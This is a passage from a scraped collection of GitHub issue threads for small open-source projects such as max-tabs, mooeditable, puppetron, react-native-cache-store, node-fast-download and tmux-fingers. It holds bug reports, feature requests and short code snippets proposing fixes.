Or... Can you report this as a bug on firefox, @cheeaun ? I don't have enough expertise to explain it.
</Body>
    </Comment>
  </Issue_818>
  <Issue_819>
    <Repository>max-tabs</Repository>
    <Title>open tab on next available window</Title>
    <Owner>cheeaun</Owner>
    <Body>Hi!

Thanks for the last update.

---

Sometimes, when we have more than one window open, firefox uses the last one focused to open links.

Is it possible to open the link on the other window, if this one is full?

Thanks!
</Body>
    <State>open</State>
    <Comment>
      <Owner>robsonsobral</Owner>
      <Body>Ok! I gave up!

I tried, but, first, I couldn't find the URL being requested to send it to another window. Because of that, I had to wait for the `ready` event. Then, I couldn't find how to loop through windows and open the tab.

``` .js
if (windows.browserWindows.length &gt; 1){
    tab.on('ready', function(tab){
        for (var i = 0, w = windows.browserWindows.length; i &lt; w; i++){
            if (browserWindows.activeWindow !== window[i] &amp;&amp; window[i].tabs.length &lt;= max){
                window[i].tabs.open(tab.url);
                break;
            }
        }
        tab.close();
        notifications.notify({
            title: title,
            text: _('not_open_max_tabs', max)
        });
    });
} else {
```

So, #15 is also beyond my capabilities.
</Body>
    </Comment>
  </Issue_819>
  <Issue_820>
    <Repository>max-tabs</Repository>
    <Title>Count tabs per Group</Title>
    <Owner>cheeaun</Owner>
    <Body>Firefox Tab Groups are currently ignored - so only the total count of all groups matters.
Is it possible to have a maximum number of tabs per group?
</Body>
    <State>open</State>
    <Comment>
      <Owner>Ghos3t</Owner>
      <Body>I second this
</Body>
    </Comment>
  </Issue_820>
  <Issue_821>
    <Repository>moodoco</Repository>
    <Title>Position fixed for #menu/.methods</Title>
    <Owner>cheeaun</Owner>
    <Body>Any chance you could make #menu/.methods scroll down when it hits the top of the browser? 
</Body>
    <State>open</State>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>It's rather hard tho', since #menu takes up a lot of vertical space :/
</Body>
    </Comment>
    <Comment>
      <Owner>digitarald</Owner>
      <Body>I have a class for that, ping me in email/gtalk/skype since its not on github yet.
</Body>
    </Comment>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>Nice, but what I mean is the height of the #menu/.methods could exceed the viewport height, so....
</Body>
    </Comment>
  </Issue_821>
  <Issue_822>
    <Repository>mooeditable</Repository>
    <Title>How to set a new Locale for example spanish</Title>
    <Owner>cheeaun</Owner>
    <Body>I had been trying to set a new Locale for my language Spanish but i just can't do it properly, could you point me in the right direction?

thanks for your help.
</Body>
    <State>open</State>
    <Comment>
      <Owner>nielsvantilborg</Owner>
      <Body>Try this:
Get the Mootools More 1.4 asset from  http://mootools.net/more/ only select Locale.

Add scripts
src="../assets/mootools.js"
src="../assets/mootools-more-1.4.0.1.js"
src="../../Source/Locale/Locale.es-ES.MooEditable.js"
src="../../Source/MooEditable/MooEditable.js"
</Body>
    </Comment>
  </Issue_822>
  <Issue_823>
    <Repository>mooeditable</Repository>
    <Title>Can't place cursor before or after table</Title>
    <Owner>cheeaun</Owner>
    <Body>When using only a table (so remove all the text) in the editor it is not possible to place the cursor before or after the table anymore. The cursor can only be placed inside the table

The workaround I use now is to place a &lt;p&gt;&lt;/p&gt; before or after the table in the 'code-view'.
</Body>
    <State>open</State>
    <Comment>
      <Owner>fuegas</Owner>
      <Body>This is caused by [line 121](https://github.com/cheeaun/mooeditable/blob/master/Source/MooEditable/MooEditable.Table.js#L121). Here the table is set to full width, hence you won't be able to get your cursor behind it.
In my fork I heavily modified tables (and I'm not done yet), and there this issue is resolved. Well, ok, not when you have that much data in your tables it actually uses the whole width, but you can modify it by the html view if needed.
</Body>
    </Comment>
  </Issue_823>
  <Issue_824>
    <Repository>mooeditable</Repository>
    <Title>Save form on return on other input fields does not work anymore</Title>
    <Owner>cheeaun</Owner>
    <Body>I have a form with multiple input fields and a mooeditable. before I transformed the textarea to a mooeditable,  I could send the form via pressing enter/return on a input-field. but now on pressing return, the focus is moved to the first mooeditable-toolbar button and this button is toggled - and the form is not sent. this happens in chromium and firefox.
</Body>
    <State>open</State>
    <Comment>
      <Owner>natebeaty</Owner>
      <Body>FYI, I ended up fixing this issue on my older install of mooeditable by also adding `type="button"` to the buttons in the HTML created for the dialogs.
</Body>
    </Comment>
  </Issue_824>
  <Issue_825>
    <Repository>mooeditable</Repository>
    <Title>Pasting plain text with CleanPaste plugin in Google Chrome fails</Title>
    <Owner>cheeaun</Owner>
    <Body>If there is plain text, no html, in the clipboard  the MooEdtiable.CleanPaste.js function call

`````` e.clipboardData.getData('text/html')```
on line 51 returns nothing in current versions of **Google Chrome** (Firefox works just fine) thus failing the paste action.
Use additional
```e.clipboardData.getData('Text')```
to fix that.
``````
</Body>
    <State>open</State>
    <Comment>
      <Owner>angelsk</Owner>
      <Body>This should have been fixed in https://github.com/cheeaun/mooeditable/commit/66de0cca53b081d1f73da9ef57d833bdc1c0f41c which was merged from my pull request :)
</Body>
    </Comment>
  </Issue_825>
  <Issue_826>
    <Repository>mooeditable</Repository>
    <Title>Double Click</Title>
    <Owner>cheeaun</Owner>
    <Body>Small small typo on line 247 in MooEditable.js:
            dbllick: this.editorDoubleClick.bind(this),
should be:
            dblclick: this.editorDoubleClick.bind(this),

Also would you be interested in expanding 

```
editorDoubleClick: function(e){
    this.fireEvent('editorDoubleClick', [e, this]);
},
```

to 
    editorDoubleClick: function(e){
        this.actions.each(function(action){
            var item = this.toolbar.getItem(action);
            if (item) {
                var dblclick = MooEditable.Actions[action]['ondblclick'];
                if (typeOf(dblclick) == 'function'){
                    dblclick.attempt([item,e], this);
                    return;
                }
            }
        }.bind(this));
        this.fireEvent('editorDoubleClick', [e, this]);
    },

This would allow custom buttons to have a double click feature. For example, the createlink button can be extended so that if the users double clicks on a link then the link dialog will open up for edting.   
</Body>
    <State>open</State>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>Fixed in bb58ac82972bd93548cdd389eeeea145c11abc4b

Not closing this issue since the double click feature seems like a good idea. Will be looking into this.
</Body>
    </Comment>
  </Issue_826>
  <Issue_827>
    <Repository>mooeditable</Repository>
    <Title>[Enhancement] Extend default Range-Object for IE 8</Title>
    <Owner>cheeaun</Owner>
    <Body>IE 8 doenst support Range-methods like "selectNode()". So extend the Range-Object. TinyMCE does this in a good way. I think it can easily be adapted.
</Body>
    <State>open</State>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>There's MooEditable.Selection.selectNode
</Body>
    </Comment>
    <Comment>
      <Owner>SunboX</Owner>
      <Body>Hm, ah ok. Works fine in Firefox but does not in IE. I&#180;ve not much time now, will take a look later. thx
</Body>
    </Comment>
  </Issue_827>
  <Issue_828>
    <Repository>node-hnapi</Repository>
    <Title>Comments count is off </Title>
    <Owner>cheeaun</Owner>
    <Body>story `10963568` from `/news` shows 187 comments but hitting `item/10963568` shows only 9 for `comments_count`

see: https://whispering-fortress-7282.herokuapp.com/news
and: https://whispering-fortress-7282.herokuapp.com/item/10963568
</Body>
    <State>open</State>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>So let me explain this; the cause of the bug is mainly from Firebase HN API _sometimes_ returning 401 (Permission denied) responses for some of the comments. For the past few changes that I've committed, I purposely set a timeout for _every single_ request to Firebase. If it's too slow, due to too many comments, it'll just silently fail. If it's 401, due to Firebase's weird bug, it'll also silently fail.

Before this solution, the _whole request_ on the API (this one, not HN) fails, so I decided that it's still better to return _some_ comments rather than _none_. Thus, explains why the comment count is wrong.

I'm not sure how to fix this, but hoping that it'll be fixed on Firebase side. Probably this one: https://github.com/HackerNews/API/pull/6
</Body>
    </Comment>
    <Comment>
      <Owner>burntcookie90</Owner>
      <Body>Yeah I figured it was something similar, with the lack of updates on the hacker news firebase side, does it make sense to _not_ use a scraper? 
</Body>
    </Comment>
  </Issue_828>
  <Issue_829>
    <Repository>puppetron</Repository>
    <Title>How to use clipSelector for screenshot</Title>
    <Owner>cheeaun</Owner>
    <Body>How to use clipSelector for screenshot? &#13;
&#13;
This works just fine:&#13;
https://puppetron.now.sh/screenshot/http://www.xe.com/currencycharts/%3Ffrom%3DUSD%26to%3DCAD%26view%3D1D?width=500&amp;height=900&#13;
&#13;
However, after adding `&amp;clipSelector=div.module.clearfix` to the end of it, it is no longer working:&#13;
&#13;
https://puppetron.now.sh/screenshot/http://www.xe.com/currencycharts/%3Ffrom%3DUSD%26to%3DCAD%26view%3D1D?width=500&amp;height=900&amp;clipSelector=div.module.clearfix&#13;
&#13;
I got:&#13;
&#13;
```&#13;
Oops. Something is wrong.&#13;
&#13;
Protocol error (Emulation.setDeviceMetricsOverride): Invalid parameters height: integer value expected&#13;
&#13;
```&#13;
&#13;
Is it a bug? &#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>suntong</Owner>
      <Body>BTW, IMO, when specifying `clipSelector`, then the dimensions should be determined by that element, which means that the global parameters `width` &amp; `height` should not be mandatory. &#13;
</Body>
    </Comment>
    <Comment>
      <Owner>suntong</Owner>
      <Body>~~I don't even know how I was able to use the `clipSelector` previously, as I don't see how to do it from the web UI now, yet I don't see any code changes since my question. Strange~~ (Oh, I was doing from cli). Anyway, &#13;
&#13;
I took a look at the code, and apparently it was implemented before screenshot for a specific _element_ was available. Now it is --&#13;
 https://github.com/GoogleChrome/puppeteer/blob/master/docs/api.md#elementhandlescreenshotoptions&#13;
&#13;
hope it'll get fixed soon (and add an optional input for it on [web UI](https://puppetron.now.sh/) too). thx. &#13;
</Body>
    </Comment>
  </Issue_829>
  <Issue_830>
    <Repository>puppetron</Repository>
    <Title>Returns result too fast causing titles not to be updated.</Title>
    <Owner>cheeaun</Owner>
    <Body>Am trying out your solution to see if it is a good fit for our solution. We have a PWA build that fetches some information from our GraphQL backend. The page I'm trying to load fires the DOM-loaded event very early. This causes issues as the page is actually still loading some information..&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>I guess there are two workarounds:&#13;
&#13;
1. Tweak the [`waitUntil`](https://github.com/GoogleChrome/puppeteer/blob/master/docs/api.md#pagegotourl-options) to use `networkidle` (newer `Puppeteer` uses `networkidle0` or `networkidle2`.&#13;
2. Use [`waitFor`](https://github.com/GoogleChrome/puppeteer/blob/master/docs/api.md#pagewaitforselectororfunctionortimeout-options-args) to wait for information/elements to appear.</Body>
    </Comment>
  </Issue_830>
  <Issue_831>
    <Repository>puppetron</Repository>
    <Title>lost port numbers</Title>
    <Owner>cheeaun</Owner>
    <Body>When not running on port 80 we encountered a problem where the port number (ex: 8080) was getting dropped and therefore suggest some thing like:&#13;
  &#13;
 ```const {origin, hostname, pathname, searchParams, port} = new URL(url);&#13;
    const path = decodeURIComponent(pathname);&#13;
&#13;
    await new Promise((resolve, reject) =&gt; {&#13;
        const req = http.request({&#13;
            method: 'HEAD',&#13;
            port: port,&#13;
            host: hostname,&#13;
            path,&#13;
        }, ({statusCode, headers}) =&gt; {```&#13;
instead of &#13;
```&#13;
    const {origin, hostname, pathname, searchParams} = new URL(url);&#13;
    const path = decodeURIComponent(pathname);&#13;
&#13;
    await new Promise((resolve, reject) =&gt; {&#13;
        const req = http.request({&#13;
            method: 'HEAD',&#13;
            host: hostname,&#13;
            path,&#13;
        }, ({statusCode, headers}) =&gt; {&#13;
            if (!headers || (statusCode == 200 &amp;&amp; !/text\/html/i.test(headers['content-type']))) {&#13;
        reject(new Error('Not a HTML page'));```&#13;
ironically, I don't have easy access to port 80 so haven't tested this much yet, but thought I would raise the issue.&#13;
&#13;
cheers,&#13;
Mark</Body>
    <State>open</State>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>Ah okay you're right, if you need URLs with non-80 port to work. It will need an extra [`port`](https://nodejs.org/api/url.html#url_url_port). Is it possible for you to open a PR?</Body>
    </Comment>
  </Issue_831>
  <Issue_832>
    <Repository>react-native-cache-store</Repository>
    <Title>Cannot read property 'message' of null</Title>
    <Owner>cheeaun</Owner>
    <Body>I set the token to expire after 1440 minutes (24 hours), but if I try to make any requests using the token after that time, I get this error message.</Body>
    <State>open</State>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>@kitsune7 hey do you have a sample code somewhere?</Body>
    </Comment>
    <Comment>
      <Owner>kitsune7</Owner>
      <Body>Yeah, what parts do you want to see? It's on a private repo, but I can share segments.&#13;
I set an authentication token after logging in like so:&#13;
```&#13;
const ONE_DAY_IN_MINUTES = 1440&#13;
store.set('auth-token', data.auth.token, ONE_DAY_IN_MINUTES)&#13;
```&#13;
I use the token in `authMiddleware.js` like this:&#13;
```&#13;
&#13;
import {applyMiddleware} from 'apollo-client'&#13;
import CacheStore from 'react-native-cache-store'&#13;
import {isEmpty} from 'lodash'&#13;
&#13;
export default {&#13;
  async applyMiddleware(req, next) {&#13;
&#13;
    const {operationName} = req.request&#13;
&#13;
    if (!req.options.headers) {&#13;
      req.options.headers = {} // Create the header object if needed.&#13;
    }&#13;
&#13;
    const token = await CacheStore.get('auth-token')&#13;
&#13;
   if (!isEmpty(token)) {&#13;
    req.options.headers.authorization = `Bearer ${token}`&#13;
   }&#13;
&#13;
   if (operationName === 'auth') {&#13;
    req.options.headers.authorization &amp;&amp; delete req.options.headers.authorization&#13;
   }&#13;
&#13;
   next()&#13;
  }&#13;
}&#13;
```&#13;
&#13;
I also made it so when my app starts up it will skip the login screen if it still has an authentication token:&#13;
```&#13;
componentWillMount = async () =&gt; {&#13;
    const token = await store.get('auth-token')&#13;
&#13;
    const { currentScene, currentSceneProps } = this.props&#13;
    let navigateTo = currentScene&#13;
    &#13;
    if (!isEmpty(token)) {&#13;
      if (!currentScene || currentScene === 'Init') {&#13;
        navigateTo = "Dashboard"&#13;
      }&#13;
      //Actions['Dashboard']({...currentSceneProps, autoLoaded: true})&#13;
      Actions[navigateTo]({...currentSceneProps, autoLoaded: true})&#13;
    } else {&#13;
      Actions.Login()&#13;
    }&#13;
  }&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>nicolashemonic</Owner>
      <Body>Hi guys,&#13;
&#13;
I experience same issue, in my case the error `cannot read property of null` is thrown by a `try catch(e)` who receive null instead of an exception who report a `e.message`.&#13;
&#13;
After investigation this issue is a side effect of the Cache behavior. The Cache do not verify the value before resolving the promise, in the case of a `null` value the promise is `resolve` whereas it should not.&#13;
&#13;
Find below my correction:&#13;
&#13;
```javascript&#13;
 get(key: string) {&#13;
  const theKey = CACHE_PREFIX + key;&#13;
  const exprKey = CACHE_EXPIRATION_PREFIX + key;&#13;
  return AsyncStorage.getItem(exprKey).then(expiry =&gt; {&#13;
   if (expiry &amp;&amp; currentTime() &gt;= parseInt(expiry, 10)) {&#13;
    AsyncStorage.multiRemove([exprKey, theKey]);&#13;
    return Promise.reject(null);&#13;
   }&#13;
   return AsyncStorage.getItem(theKey).then(item =&gt; {&#13;
&#13;
                                // CORRECTION: reject Promise if item is null&#13;
    if (item) {&#13;
     return Promise.resolve(JSON.parse(item));&#13;
    }&#13;
    return Promise.reject(null);&#13;
   });&#13;
  });&#13;
 },&#13;
```&#13;
&#13;
And for information, you should not write `new Promise.reject()` because `reject` is a static method of Promise class.&#13;
&#13;
I can pull request if you want &#128521;</Body>
    </Comment>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>@nicolashemonic a PR would be very helpful &#128583; </Body>
    </Comment>
    <Comment>
      <Owner>nicolashemonic</Owner>
      <Body>@cheeaun PR done! Let me know if it's good to you &#128578;</Body>
    </Comment>
  </Issue_832>
  <Issue_833>
    <Repository>node-fast-download</Repository>
    <Title>May use very much memory when chunksAtOnce &gt; 1</Title>
    <Owner>zenflow</Owner>
    <Body>If chunksAtOnce is greater than 1, memory start to increase until file is downloaded, so if file is big node exit with code 137 or similar.&#13;
&#13;
**Posible solution:** Store chunks temporaly in file instead of RAM and merge after download.</Body>
    <State>open</State>
    <Comment>
      <Owner>zenflow</Owner>
      <Body>@ProtocolNebula how are you profiling this?</Body>
    </Comment>
    <Comment>
      <Owner>ProtocolNebula</Owner>
      <Body>I'm using the example wrapped into a promise and linked to progress bar (in typescript).&#13;
&#13;
The only think that can be "wrong" in my code is:&#13;
&#13;
```js&#13;
dl.on('data', function (chunk) {&#13;
                try {&#13;
                    bar.tick(chunk.length);&#13;
                } catch (ex) { }&#13;
            });&#13;
```&#13;
&#13;
I'm trying to download really big files (from 50MB to 2GB) into raspberry pi (1GB memory maximum).&#13;
If only 1 chunk setted, it pipe all code to file, so the full memory compsumition of the app is around 50MB.&#13;
&#13;
I try to upload this week the wrapper to github/npm.</Body>
    </Comment>
    <Comment>
      <Owner>zenflow</Owner>
      <Body>Ok, so this is what **should** be happening (and so far we have no reason to believe that it's not working properly, because it does potentially consume a lot of RAM):&#13;
&#13;
The leading chunk is streamed right through (nothing buffered into memory), and while that is happening, the following chunks are buffered into memory until the stream reaches their position.&#13;
&#13;
And because of the specific algorithm used, it's possible for many chunks (more than `chunksAtOnce`) to be buffered in memory if the leading chunk hasn't completed yet, but the other following chunks have completed. For example:&#13;
&#13;
chunksAtOnce = 3&#13;
&#13;
| chunk 1 | chunk 2 | chunk 3 | chunk 4 | chunk 5 | chunk 6 |&#13;
|##-------|#######|#######|######|#####---|###------|&#13;
&#13;
Data received for chunks 2 to 6 is all buffered in memory. Only the data received for chunk 1 has been streamed through.</Body>
    </Comment>
    <Comment>
      <Owner>zenflow</Owner>
      <Body>&gt; Posible solution: Store chunks temporaly in file instead of RAM and merge after download.&#13;
&#13;
That's a good idea, except it would be a major revision (almost a rewrite) of this package, and I'm not much interested in continuing major work on this package. &#13;
&#13;
If you want to work on this, my suggestion is to create your own fresh new package, and use as much or as little of the code here as you want.&#13;
&#13;
Or you can use one of the other packages on npm that do the same thing as this package, but already allow you to buffer downloaded data in the filesystem as opposed to RAM:&#13;
- https://www.npmjs.com/package/mt-downloader&#13;
- https://www.npmjs.com/package/multipart-download</Body>
    </Comment>
    <Comment>
      <Owner>ProtocolNebula</Owner>
      <Body>I was looking for some package like this but not found, I will try with those tow.&#13;
Thanks!</Body>
    </Comment>
  </Issue_833>
  <Issue_834>
    <Repository>node-fast-download</Repository>
    <Title>stop download programatically</Title>
    <Owner>zenflow</Owner>
    <Body>How can I stop download programatically ? And is there a way to pause/resume download ?</Body>
    <State>open</State>
    <Comment>
      <Owner>zenflow</Owner>
      <Body>@karmac2015 You can call the (undocumented) `dl.abort()` method to stop the download. &#13;
&#13;
To resume it, if this package is saving to a file for you (i.e. using the `destFile` option) then you can create another FastDownload object with the `resumeFile` option set to `true`. Otherwise (if not using `destFile` option) you would have to create another FastDownload object with the `start` option set to where the last one left off.&#13;
&#13;
Unfortunately there is currently no way to pause and then resume with the same FastDownload object. It should be possible though, if you are inclined to make a PR. If you are, let me know and I can provide some additional guidance.&#13;
&#13;
</Body>
    </Comment>
  </Issue_834>
  <Issue_835>
    <Repository>console-goodies</Repository>
    <Title>Feature Request : Make yelling easier</Title>
    <Owner>Morantron</Owner>
    <Body>Following in the footsteps of the extremely useful `console.wtf`, we should add a `console.yell`, which will log a given message in all caps. &#13;
&#13;
**Why?**&#13;
&#13;
Because that's what a lot of us do 5 minutes into a debugging session. This would allow devs to maintain the practice of yelling in the console without having to unleash the fury of typing in all caps on their keyboards.&#13;
&#13;
I wouldn't mind contributing this feature to the project. However, I wanted to be confident that you're welcoming of the idea before proceeding with the development.</Body>
    <State>open</State>
    <Comment>
      <Owner>Morantron</Owner>
      <Body>OMG, that'd be a brilliant feature, one can only imagine the unleashed productivity :o&#13;
&#13;
Please proceed! PR will be more than welcome. \o/</Body>
    </Comment>
  </Issue_835>
  <Issue_836>
    <Repository>tmux-fingers</Repository>
    <Title>[Feature request] Move cursor to the position of the hints</Title>
    <Owner>Morantron</Owner>
    <Body>As the title said, it would be nice have the cursor move to the the location of the hint you type.&#13;
&#13;
This is because we can not predict all kind of texts we might want to copy, so this feature would be helpful and speed things up (by moving the cursor to a good starting point) whenever that happen.&#13;
&#13;
Also, if you want to do this, you might want to do both copying and moving the cursor at the same time because:&#13;
+ if the text you want to copy happens to match some regex you are done.&#13;
+ if it is not, your cursor would be moved to a good starting point.</Body>
    <State>open</State>
    <Comment>
      <Owner>Morantron</Owner>
      <Body>Hi! Sorry I don't understand your proposal &#128584; There is no concept of cursor in this plugin. Can explain your idea in another way?&#13;
&#13;
Thanks &#128588;</Body>
    </Comment>
    <Comment>
      <Owner>snippins</Owner>
      <Body>Hi, sorry if it is confusing. &#13;
&#13;
I understand there is no concept of cursor in the plugin, I'm proposing an addition behavior after we type a hint. This involves moving the cursor in tmux copy mode after we type a hint.&#13;
&#13;
I am using **@fingers-compact-hints=1** and **@fingers-hint-position=left**, so the hints are appeared right at the start of the matches in my case.&#13;
&#13;
Assuming we are in copy mode, and call tmux-fingers to copy something. Sometimes the text we want to copy does not match the regexes we defined, but the location of the hints might be a good starting point to start selecting the text.&#13;
&#13;
So the idea is to **move the cursor in copy-mode of tmux to  the location of the typed hint (i.e the start of the matched text)**, basically like the plugins easymotion (for Vim) or acejump (for Emacs).&#13;
&#13;
With this additional behavior, if the text we want to copy match the regexes we define, we are done as usual. If it isn't, as the cursor in copy mode is moved to the location of the hint we just type, we can start to select and copy text manually using normal tmux shortcuts.&#13;
&#13;
For example: if we want to copy "text1 text2", but our regexes only able to match "text1", after typing the hint for "text1", "text1" is copied to clipboard as usual, but now the cursor position is also moved to the start of "[t]ext1" (at the t letter). Now we can start selectint and copying "text1 text2" manually (not related to tmux-fingers).&#13;
&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>Morantron</Owner>
      <Body>Interesting. The main gotcha that I see, is that duplicate matches have the same hint ( multiples ocurrences of *yolo* will all have hint *[q]* ), so not sure what to do in those cases. Any ideas?</Body>
    </Comment>
    <Comment>
      <Owner>snippins</Owner>
      <Body>I see. &#13;
&#13;
My first solution: &#13;
&#13;
+ We first put the cursor at the first occurrence. This is because even when duplicate-matches thing happens, most of the time it would not affect what we want to copy anyway.&#13;
&#13;
+ For the case where it does have an effect. Then, we provide an additional shortcut to be invoked in tmux copy mode, this shortcut would create different hints for each duplicate occurrence so that we can jump to one of them. &#13;
&#13;
My second solution:&#13;
&#13;
+ We draw different hints for duplicate matches right off the bat. &#13;
&#13;
What do you think of these?&#13;
&#13;
Also, I am interesting in making a PR for this feature. Though I need some direction and to know how you want it to be implemented.&#13;
&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>Morantron</Owner>
      <Body>Just realized, there is an oncoming feature that could allow this, with some hackery in `.tmux.conf`. &#13;
&#13;
https://github.com/Morantron/tmux-fingers/pull/61&#13;
&#13;
The idea is that you could put a command in `@fingers-copy-command` that enters copy mode and searches for the result.&#13;
&#13;
I'll check if it's possible when it's released.</Body>
    </Comment>
    <Comment>
      <Owner>Morantron</Owner>
      <Body>Looks like you cannot perform searches programatically in tmux. I took a look at [tmux-copycat](http://github.com/tmux-plugins/tmux-copycat) and it translates `line:col` information of the matches to cursor key strokes.&#13;
&#13;
Problem is we currently don't have that information, so that could be a first step. It can be inferred from [hinter.awk main loop](https://github.com/Morantron/tmux-fingers/blob/master/scripts/hinter.awk#L139).&#13;
&#13;
Would you be interested in implementing that? :pray: </Body>
    </Comment>
    <Comment>
      <Owner>snippins</Owner>
      <Body>Right now I have something like this in my config to solve the problem. &#13;
&#13;
`set -g @fingers-copy-command 'xclip -i -sel p -f | xclip -i -sel c &amp;&amp; xdotool key ctrl+s key shift+slash key ctrl+shift+v key Return'&#13;
`&#13;
&#13;
With "Ctrl+s" as the shortcut used to enter copy mode, don't ask why lol.</Body>
    </Comment>
    <Comment>
      <Owner>Morantron</Owner>
      <Body>hey that's cool! :ok_hand: &#13;
&#13;
you can set it to `@fingers-copy-command-uppercase` so it only triggers when you hold SHIFT while entering the hint</Body>
    </Comment>
    <Comment>
      <Owner>snippins</Owner>
      <Body>Thanks for the info, also I literally just thought about this and made the command like 1 hour ago :). Should I close this? It would be a good example to put in README.md I think.&#13;
&#13;
Bonus the command to search downward instead&#13;
&#13;
`set -g @fingers-copy-command 'xclip -i -sel p -f | xclip -i -sel c &amp;&amp; xdotool key ctrl+s key H key slash key ctrl+shift+v key Return'&#13;
`&#13;
&#13;
I use copy-mode-vi so H will make the cursor go to the top of the terminal screen.&#13;
</Body>
    </Comment>
  </Issue_836>
  <Issue_837>
    <Repository>tmux-fingers</Repository>
    <Title>allow disabling default regexp</Title>
    <Owner>Morantron</Owner>
    <Body>Is it possible to disable the default search parameters? I don't really need number searching, and I don't really find the path searching that useful since it gets a lot of false positives. Thus, these hints clutter the display making it harder to locate the things I want to copy.</Body>
    <State>open</State>
    <Comment>
      <Owner>Morantron</Owner>
      <Body>In the current version is not possible to disable default patterns, but that's a good point.&#13;
&#13;
It could be fixed by conditionally adding patterns to the `PATTERN_LIST` array [here](https://github.com/Morantron/tmux-fingers/blob/d4f086de291ed6dc5759540675179453b5b62b75/scripts/config.sh#L26).&#13;
&#13;
To enable this, a new variable `@fingers-enabled-default-patterns` could be set to comma separated names of patterns. ex: `shas,digits,ips`&#13;
&#13;
PR welcome! \o/</Body>
    </Comment>
  </Issue_837>
  <Issue_838>
    <Repository>underclass</Repository>
    <Title>Problem with minifiers</Title>
    <Owner>Morantron</Owner>
    <Body>When you define a class like so:

``` js
_.class({
  initialize: function($name, $age) { ... }
});
```

...those names will be changed upon minification (say with `uglifyjs -m`), and will not work as intended anymore.

I don't think there's any easy way to fix this, unfortunately.
</Body>
    <State>open</State>
    <Comment>
      <Owner>rhysbrettbowen</Owner>
      <Body>the only way to really fix this is to go down the same route as angularJS and have a separate array that can be defined that holds strings of what each argument should be called. The main problem is then that these properties will be defined on the object at run time and if you try to access them then the minifier _may_ rename those unless you use square brackets notation to access the properties.

I know with Closure compiler you can export symbols to let the compiler know not to rename certain properties, not sure what uglify does though
</Body>
    </Comment>
    <Comment>
      <Owner>Morantron</Owner>
      <Body>Hi!

As @rhysbrettbowen commented, AngularJS guys solve this by defining the arguments in a separate array ( so that the `annotate` function that looks up the function arguments returns this array instead of the actual arguments which are minified and meaningless ). However,  having to manually type these arguments for each method adds a lot of boilerplate.

One solution that I think could work is to write a grunt task that needs to be run before minification that fills those arrays automatically.

``` javascript
//before minification
var Person = _.class({
     initialize: function($name, $surname){},
     someMethod: function(self, something){}
});

//after pre-minification task
var Person = _.class({
     initialize: function($name, $surname){},
     someMethod: function(self, something){}
});
Person.prototype.initialize.$args = [ '$name', '$surname' ];
Person.prototype.someMethod.$args = [ 'self', 'something'];
```

If this works and I'm not missing something, you don't have to worry about these quirks while developing, but only when deploying.

I'll give it a try, thanks for your feedback! =]
</Body>
    </Comment>
  </Issue_838>
  <Issue_839>
    <Repository>Placeholders</Repository>
    <Title>Fix Long Paragraph descriptions and add tab stops to HTML snippets</Title>
    <Owner>mrmartineau</Owner>
    <Body>I Fixed the descriptions for both Long Paragraph snippets, which were incorrectly listing them as Medium Paragraphs. I also added tab stops with default values to the HTML snippets.
</Body>
    <State>open</State>
    <Comment>
      <Owner>Rockstar04</Owner>
      <Body>Could we please revisit this??
</Body>
    </Comment>
  </Issue_839>
  <Issue_840>
    <Repository>SetiUI-Icons-Sublime</Repository>
    <Title>Update installation folder instructions</Title>
    <Owner>mrmartineau</Owner>
    <Body>Putting the downloaded folder into `Packages/User` directory did not work for me. Fixed by moving it directly into `Packages`.  
ST build 3114
</Body>
    <State>open</State>
    <Comment>
      <Owner>swill</Owner>
      <Body>I have not been able to get anything to work.  I have tried many different approaches and I am unable to get anything to work.

My color scheme is here:
`"color_scheme": "Packages/Color Scheme - Default/Solarized (Dark).tmTheme",`

Where would I be putting this and what would the name of the folder be?
</Body>
    </Comment>
    <Comment>
      <Owner>swill</Owner>
      <Body>I ended up having to put the icons into the theme folder and that worked.
</Body>
    </Comment>
    <Comment>
      <Owner>kyleshevlin</Owner>
      <Body>How do you handle this situation when your theme is an installed package, and thus is in the `Installed Packages` directory as a file, and not a directory?&#13;
&#13;
For example, I use the itg.flat theme. It is in my `Installed Packages` directory as `Theme - itg.flat.sublime-package`. Thus, I can't name the icons directory the same name as my theme's directory because it isn't a directory.</Body>
    </Comment>
    <Comment>
      <Owner>swill</Owner>
      <Body>This is what I did: https://github.com/swill/Theme-SolarizedSwill&#13;
&#13;
This theme is very static to my use case, but you can get an idea from it. I could not find a way to theme the drawer without overriding the `Default.sublime-theme` file, but that file is a global config file and will make the drawer themed with that theme regardless of which theme you select.&#13;
&#13;
Anyway, hope this is helpful for you...</Body>
    </Comment>
    <Comment>
      <Owner>18718821950</Owner>
      <Body>&gt; This is what I did: https://github.com/swill/Theme-SolarizedSwill&#13;
&gt; &#13;
&gt; This theme is very static to my use case, but you can get an idea from it. I could not find a way to theme the drawer without overriding the `Default.sublime-theme` file, but that file is a global config file and will make the drawer themed with that theme regardless of which theme you select.&#13;
&gt; &#13;
&gt; Anyway, hope this is helpful for you...&#13;
&#13;
We can rename the filename Default.sublime-theme to Default.sublime-theme.zip and then you will find the folder of icons, Although it is now 2019,I hope to help the latecomers&#13;
</Body>
    </Comment>
  </Issue_840>
  <Issue_841>
    <Repository>SublimeTextSetupWiki</Repository>
    <Title>automated method to install multiple packages?</Title>
    <Owner>mrmartineau</Owner>
    <Body>I love this sort of list; really nice job putting it together.

Once Package Control is in place, is there a nice way to bulk install all these packages? I ask because I'm putting together a larger framework and I'd like the install script to be able to set up the SublimeText packages on its own.  

So ideally, you run my install script (let's assume its a shell script on os x, windows):
- if ST2 is installed, install PackageControl if it's not there already.
- once PC is in, install a list of these packages (or my own list)
- you then open ST2 all the magic is there,  waiting for you

Is this at all possible?

ping @wbond as he's the expert here.
</Body>
    <State>open</State>
    <Comment>
      <Owner>wbond</Owner>
      <Body>To install Package Control, http://sublime.wbond.net/Package%20Control.sublime-package needs to be placed inside of the _Installed Packages/_ folder. The next time Sublime starts, it will install the package.

